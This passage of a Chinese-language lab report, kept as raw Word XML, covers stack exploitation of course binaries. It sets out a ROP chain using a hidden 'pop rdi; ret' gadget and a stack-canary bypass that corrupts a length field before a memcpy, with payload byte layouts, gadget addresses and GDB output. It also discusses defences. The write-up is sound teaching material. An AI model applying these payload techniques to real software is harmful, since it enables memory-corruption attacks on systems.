          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">），并且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[rsp] = 0x401ac3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，即 shellcode 预先压入的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返回地址。运行结果为退出码 0：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Enter an expression (length up to 15):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 xml:space="preserve"> Hope A will be your grade!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Enter an expression (length up to 15):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42_is_The_Ànswer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12  任务二的成功输出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grade_eval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打印并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fflush(stdout)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后返回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再次调用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，读到 EOF，打印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42_is_The_Ànswer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并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exit(0)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，所以整个进程是正常结束的。</w:t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6  main 的机器码在内存中的布局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6.1  前三行汇编与机器码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0x401ac3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">）处下断点，用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x/20xb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 查看内存，前三行汇编对应：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232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地址区间</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="238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机器码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288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汇编</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="119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长度</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="232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0x401ac3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55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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push rbp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="119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32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0x401ac4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0x401ac6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48 89 e5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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mov rbp, rsp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="119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32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0x401ac7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0x401acb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b8 00 00 00 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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mov eax, 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="119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2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0x401acc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0x401ad0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e8 a6 fe ff ff</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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call 0x401977 &lt;input&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="119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10  main 前几条指令的机器码与地址区间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内存中的原始字节为：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0x401ac3: 55 48 89 e5 b8 00 00 00 00 e8 a6 fe ff ff b8 00 00 00 00 e8 ...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13  从 main 开始的内存字节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6.2  排列方式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x86-64 是按字节寻址的，指令在内存中按地址递增的方向连续存放。多字节的操作数/立即数采用小端序：例如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mov eax, 0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的立即数 0 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00 00 00 00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call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32 位相对位移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a6 fe ff ff</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表示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0xfffffea6 = -0x15a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，从下一条指令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0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回退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0x15a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 正好是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0x401977</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。指令之间没有对齐填充，每条指令占用的字节数由指令编码决定。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si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 逐条执行时，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rip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的变化为：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0x401ac3  push rbp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0x401ac4  mov rbp,rsp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0x401ac7  mov eax,0x0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0x401acc  call 0x401977 &lt;input&gt;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0x401977  input: push rbp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14  单步执行时 rip 的变化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这说明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rip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 总是指向下一条要执行的指令；CPU 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rip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指向的地址取指，按指令长度自增。从攻击视角看，代码段本质上也是可读的字节序列：只要地址固定、内容可控，就可以把数据当作指令执行。第 5 节的 shellcode 正是把这一思想搬到了栈上。</w:t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7  任务三：ROP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7.1  保护与约束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dark-calc-nx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的栈是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RW</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">（不可执行），且栈地址随 ASLR 随机变化；但它是 Non-PIE，代码段固定加载在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0x400000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 附近。因此不能像任务二那样跳到栈上执行，但可以把栈上的返回地址改成代码段中已有的短指令序列（gadget），用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把它们串起来。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题目提示 gadget 位于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0x4019d0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>–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0x401ae3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，这段主要是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__libc_csu_init</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。线性反汇编看起来只有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pop r15; ret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，但从字节中间开始可以找到未对齐的 gadget：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0x401a32:  41 5f     pop r15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0x401a34:  c3        ret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从 0x401a33 开始解释：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0x401a33:  5f        pop rdi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0x401a34:  c3        ret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15  隐藏的 pop rdi; ret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因此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0x401a33</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就是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pop rdi; ret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0x401a34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是单独的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>。这比经典的 ret2csu 更短，不需要在内存中预置函数指针。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7.2  ROP 链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目标是调用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grade_eval(4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。链的设计如下：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247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偏移</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268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5669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– 15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A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× 16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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填满 buffer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 – 23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D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× 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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假 saved rbp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0x401a33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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pop rdi; ret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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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弹出到 rdi，作为 grade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0x401a34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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单独的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ret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，用于栈对齐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0x401978</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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grade_eval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56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268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0x4019b4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669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main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，给 grade_eval 一个合法返回地址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11  payload_rop.py 的 ROP 链（共 64 字节）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执行过程：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先跳到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pop rdi; ret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，把 4 弹进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rdi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">；接着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跳到对齐用的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；再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检查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edi == 4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，打印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Hope A will be your grade!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，然后返回到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再次读输入，遇到 EOF 后打印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42_is_The_Ànswer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并正常退出。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7.3  为什么需要额外的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ret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SysV ABI 要求：执行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call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之前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 16 字节对齐的，因此函数入口处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 % 16 == 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。本链中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 % 16 == 0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 = rbp + 16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 mod 16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">）。若直接进入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，入口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 % 16 == 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，glibc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printf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可能执行对齐的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movaps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而崩溃。在链中插入一个只含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gadget，相当于把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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 再抬高 8 字节：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after input ret      rsp = rbp + 16   (0 mod 16)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pop rdi; ret          rsp = rbp + 24   (8 mod 16)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ret (alignment)       rsp = rbp + 32   (0 mod 16)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ret -&gt; grade_eval     rsp = rbp + 40   (8 mod 16)  &lt;-- ABI 正确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16  栈对齐的逐步计算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GDB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入口实测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 = 0x7fffffffe3f8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，低 4 位为 8，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rdi = 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，与计算一致。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7.4  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Enter an expression (length up to 15):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 xml:space="preserve"> Hope A will be your grade!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Enter an expression (length up to 15):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42_is_The_Ànswer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17  任务三的成功输出（退出码 0）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与任务二不同，任务三的栈地址每次运行都不同，但 ROP 链只依赖固定的代码地址，因此不受栈 ASLR 影响。这正是 Non-PIE + ROP 组合的危险之处：只要代码段地址固定，攻击者就能在二进制中反复寻找 gadget。</w:t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8  任务四：绕过 Canary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8.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>dark-log</w:t>
      </w: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 的栈布局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dark-log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在编译时开启了 Stack Protector。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的栈帧中，结构体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log_frame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的字段顺序被固定为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expression[128]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logMsg[128]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len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pad[8]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，编译器又在其后放入 canary。反汇编得到的实际偏移如下：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2296"/>
        <w:gridCol w:w="2296"/>
        <w:gridCol w:w="2296"/>
        <w:gridCol w:w="2296"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="181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249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相对 rbp 的地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2154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相对 expression 的偏移</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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expression[128]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rbp-0x120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rbp-0xa1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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… 127</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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gets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的目标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logMsg[128]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rbp-0xa0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rbp-0x21</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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128 … 255</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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memcpy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的目标基址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len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(int)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rbp-0x20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rbp-0x1d</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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256 … 259</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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memcpy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的偏移，初值 0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pad[8]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rbp-0x1c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rbp-0x15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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260 … 267</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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填充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对齐空隙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rbp-0x14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rbp-0x9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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268 … 279</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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编译器对齐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canary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rbp-0x8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rbp-0x1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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280 … 287</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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函数返回前与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fs:0x28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比较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保存的 rbp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rbp+0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="215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288 … 295</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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返回地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="249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rbp+0x8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2154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296 … 303</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="272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12  dark-log 的栈帧布局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 只受换行/EOF 限制，因此可以一直写到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len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 甚至 canary；但 canary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rbp-8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，一旦被改写，函数返回前就会调用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__stack_chk_fail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。直接覆盖返回地址会同时覆盖 canary，行不通。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8.2  利用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>len</w:t>
      </w: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 把 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>memcpy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的目标“抬高”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关键在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的第二步：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gets(f.expression);                                  // 可越界写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memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression)); // 128 字节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18  两次写操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="80" w:line="317" w:lineRule="auto"/>
        <w:ind w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>f.len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 位于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expression + 0x100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，而 canary 位于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expression + 0x118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。如果发送 0x104 字节，前 0x100 字节填满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expression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logMsg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，接下来的 4 字节写入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len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 自动补的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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 落在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expression + 0x104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，不会碰到 canary。把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len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设为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0xa0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 后：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destination = logMsg + len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 xml:space="preserve">            = (rbp - 0xa0) + 0xa0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 xml:space="preserve">            = rbp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19  memcpy 目标正好落在保存的 rbp 上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于是 128 字节的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memcpy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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expression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复制到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，恰好覆盖保存的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和返回地址，而 canary（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rbp-8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>）完全不在复制范围内。canary 校验因此通过，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leave; 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正常执行我们布置的 ROP 链。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8.3  payload 与验证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247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偏移</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="238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5556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– 7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E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× 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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假 saved rbp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0x4018a3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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pop rdi; ret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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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grade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0x4018a4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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对齐用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ret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0x401677</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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grade_eval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0x4017f5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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main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，合法返回地址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 – 255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F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× 208</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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填充到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len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之前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256 – 259</w:t>
            </w:r>
          </w:p>
        </w:tc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a0 00 00 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5556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把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f.len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设为 0xa0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13  payload_canary.py 的布局（共 0x104 = 260 字节）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GDB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memcpy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之后、canary 校验之前（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0x4017db</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>）停下，实测：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f.len (rbp-0x20): 160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canary (rbp-0x8): 0xc09754b654777100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fs:0x28:          0xc09754b654777100      &lt;-- 未被改动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saved rbp / ret:  0x4545454545454545  0x00000000004018a3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20  canary 完好、返回地址已被改写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随后程序越过 canary 校验，在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入口处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rdi = 4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 % 16 == 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，成功打印：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Enter a log message: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 xml:space="preserve"> Hope A will be your grade!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21  任务四的成功输出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打印后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还会返回到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，但本 payload 没有为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main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的最终返回准备合法地址，因此进程随后收到 SIGSEGV；成功信息在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内已经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fflush(stdout)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，不影响检查。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8.4  怎样重排局部变量才能防御？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当前布局的问题不是 canary 本身，而是“可被线性溢出的字段（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len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">）位于缓冲区高地址方向，且 canary 在更后面”。攻击者可以先改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len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，再用第二次写绕过 canary。要防御，应让“溢出写”先碰到 canary，而不能先碰到影响写目标的元数据。具体可以：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把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len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
